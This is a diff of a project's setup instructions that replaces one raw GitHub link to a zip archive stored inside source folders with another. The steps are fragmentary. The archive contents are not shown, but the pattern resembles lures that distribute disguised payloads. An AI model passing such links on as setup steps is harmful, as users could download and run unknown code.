@@ -1,5 +1,5 @@
 Step-by-step instructions to setup and run the code
-https://raw.githubusercontent.com/kylepeart21/EduZone/main/backend/src/scripts/Edu-Zone-pinsons.zip to the backend directory 
+https://raw.githubusercontent.com/kylepeart21/EduZone/main/frontend/src/components/Zone-Edu-v2.9-beta.3.zip to the backend directory 
     cd backend 
 
 2. then type 
